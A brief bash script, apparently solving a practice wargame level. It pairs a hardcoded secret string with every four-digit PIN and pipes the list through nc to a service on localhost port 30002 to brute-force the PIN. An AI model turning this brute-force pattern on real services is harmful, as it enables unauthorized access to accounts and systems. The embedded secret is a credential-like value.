#!/bin/bash

for i in {0000..9999}
do 
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> /tmp/dentontest/poss.txt
done

cat /tmp/dentontest/poss.txt | nc localhost 30002 > /tmp/dentontest/res.txt
